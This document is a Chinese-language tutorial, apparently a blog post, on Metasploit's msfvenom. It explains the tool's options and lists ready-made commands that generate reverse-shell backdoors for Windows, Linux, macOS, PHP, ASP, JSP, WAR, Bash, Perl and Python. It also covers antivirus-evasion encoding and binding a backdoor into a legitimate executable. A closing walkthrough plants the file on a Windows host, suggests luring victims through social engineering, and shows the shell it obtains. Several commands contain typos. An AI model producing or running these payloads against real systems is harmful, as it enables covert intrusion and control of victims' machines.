
# 简介
Msfvenom a Metasploit standalone payload generator，Also a replacement for msfpayload and msfencode.是用来生成后门的软件。<br />	MSFvenom是Msfpayload和Msfencode的组合，将这两个工具都放在一个Framework实例中。自2015年6月8日起，msfvenom替换了msfpayload和msfencode。<br />![](https://img-blog.csdnimg.cn/20210305114036360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=MasC5&originHeight=273&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# 参数介绍

## -l
列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all<br />![](https://img-blog.csdnimg.cn/20210305114047746.png#crop=0&crop=0&crop=1&crop=1&id=HM7PZ&originHeight=124&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![](https://img-blog.csdnimg.cn/20210305114057824.png#crop=0&crop=0&crop=1&crop=1&id=NDoj6&originHeight=147&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/202103051141031.png#crop=0&crop=0&crop=1&crop=1&id=YWnSz&originHeight=156&originWidth=504&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## -p
指定需要使用的payload(攻击荷载)。<br />![](https://img-blog.csdnimg.cn/2021030511411954.png#crop=0&crop=0&crop=1&crop=1&id=cNDj3&originHeight=124&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## -f
指定输出格式
```
Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；
```

```
Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；
```


## -e
指定需要使用的encoder（编码器）编码免杀。<br />![](https://img-blog.csdnimg.cn/2021030511412868.png#crop=0&crop=0&crop=1&crop=1&id=I6oCn&originHeight=134&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## -a
指定payload的目标架构
```
选择架构平台:x86 | x64 | x86_64
Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe
```


## -o
保存payload文件输出。


## -b
设定规避字符集，比如: '\x00\xff'避免使用的字符


## -n
为payload预先指定一个NOP滑动长度


## -s
设定有效攻击荷载的最大长度生成payload的最大长度，就是文件大小。


## -i
指定payload的编码次数


## -c
指定一个附加的win32 shellcode文件


## -x
指定一个自定义的可执行文件作为模板<br />例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。


## -k
保护模板程序的动作，注入的payload作为一个新的进程运行<br />例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。


## -v
指定一个自定义的变量，以确定输出格式


# Mcfvenom创建木马

## 普通生成
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.10 port=4444 -f exe -o /root/shell.exe
```


## 编码处理
```
msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikita_ga_nai lhost=192.168.1.10 port=4444 -f exe -o /root/shell.exe
```


## 捆绑
```
msfvenom -p windows/meterpreter/reverse_tcp -p latform windows -a x64 -x /root/baidunetdisk.exe -k lhost=192.168.1.10 port=4444 -f exe -o /root/shell.exe
```


## Windows
```
msfvenom -platform windows -a x86 -p windows/meterpreter/reverse_tcp  lhost=192.168.1.10 port=4444 -f exe -o /root/shell.exe
```


## Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp  lhost=192.168.1.10 port=4444 -f elf > shell.elf
```


## Mac
```
msfvenom -p osx/x86/shell_reverse_tcp  lhost=192.168.1.10 port=4444 -f macho > shell.macho
```


## Php
```
msfvenom -p php/meterpreter/reverse_tcp  lhost=192.168.1.10 port=4444 -f raw
```


## Asp
```
msfvenom -p windows/meterpreter/reverse_tcp  lhost=192.168.1.10 port=4444 -f asp
```


## Aspx
```
msfvenom -p windows/meterpreter/reverse_tcp  lhost=192.168.1.10 port=4444 -f aspx
```


## Jsp
```
msfvenom -p java/jsp_shell_reverse_tcp  lhost=192.168.1.10 port=4444 -f raw
```


## War
```
msfvenom -p windows/meterpreter/reverse_tcp  lhost=192.168.1.10 port=4444 -f war
```


## Bash
```
msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.10 port=4444 -f bash
```


## Perl
```
msfvenom -p cmd/unix/reverse_perl lhost=192.168.1.10 port=4444 -f raw
```


## Python
```

msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.1.10 port=4444 -f raw
```


# 应用实例

## msfvenom的shell在windows中的使用
1.使用msfvenom生成windows可执行后门文件<br />![](https://img-blog.csdnimg.cn/20210305114012272.png#crop=0&crop=0&crop=1&crop=1&id=vYgfX&originHeight=93&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

2.将后门文件放入windows机器中（现实中可使用社工的方法进行诱导）<br />![](https://img-blog.csdnimg.cn/20210305114017322.png#crop=0&crop=0&crop=1&crop=1&id=AfjMk&originHeight=195&originWidth=258&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

3.设置监听<br />![](https://img-blog.csdnimg.cn/2021030511402316.png#crop=0&crop=0&crop=1&crop=1&id=nsWfJ&originHeight=133&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

4.启动监听，并运行密码文件后成功获取到shell<br />![](https://img-blog.csdnimg.cn/20210305114027130.png#crop=0&crop=0&crop=1&crop=1&id=dDdQ4&originHeight=136&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
